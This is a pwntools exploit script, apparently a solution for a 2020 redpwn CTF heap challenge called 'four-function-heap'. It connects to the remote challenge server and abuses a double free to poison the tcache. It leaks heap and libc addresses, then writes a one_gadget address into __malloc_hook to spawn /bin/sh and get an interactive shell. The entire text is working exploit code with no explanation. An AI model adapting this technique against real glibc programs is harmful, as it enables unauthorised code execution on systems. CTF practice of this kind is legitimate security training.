from pwn import *

def new(size, contents):
    p.sendlineafter(':', '1')
    p.sendlineafter(':', '0')
    p.sendlineafter(':', str(size))
    p.sendlineafter(':', contents)

def delete():
    p.sendlineafter(':', '2')
    p.sendlineafter(':', str('0'))

def show():
    p.sendlineafter(':', '3')
    p.sendlineafter(':', str('0'))
    return p.recvuntil('free}}')

#context.update(log_level='debug')
#p = process('bin/four-function-heap')
p = remote('2020.redpwnc.tf', 31774)
size1 = 0x200
new(size1, 'A'*299) #0
for i in range(2):
    delete()#2 
addr_heap = u64(show().split('{{')[0][-7:-1].ljust(8, '\x00'))
addr_heapBase = addr_heap - 0x260
log.info('heap : ' + hex(addr_heap))

new(size1, p64(addr_heapBase + 0x10))#3
new(size1, p64(addr_heap)*0x20)#4

max_bins = 64
payload = '\x00'*((size1 / 0x10) - 1) + '\x07'*5
payload += '\x00'*(max_bins - len(payload))
payload += p64(0)*((size1 / 0x10) -1) + p64(addr_heap)*5
new(size1, payload)#5
delete()#6
addr_libc = u64(show().split('{{')[0][-7:-1].ljust(8, '\x00'))
log.info('libc: ' + hex(addr_libc))
offset_libc = 0x3ebca0
addr_libc_base = addr_libc - offset_libc
log.info('libc: ' + hex(addr_libc_base))


offset_mallocHook = 0x3ebc30
addr_mallocHook = addr_libc_base + offset_mallocHook
log.info('__malloc_hook: ' + hex(addr_mallocHook))

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

new(size1, p64(addr_mallocHook))
new(size1, p64(addr_mallocHook))
offset_oneshot = 0x10a38c
addr_oneshot = offset_oneshot + addr_libc_base
new(size1, p64(addr_oneshot))


#call malloc to execute oneshot
p.sendlineafter(':', '1')
p.sendlineafter(':', '0')
p.sendlineafter(':', '10')


p.interactive()


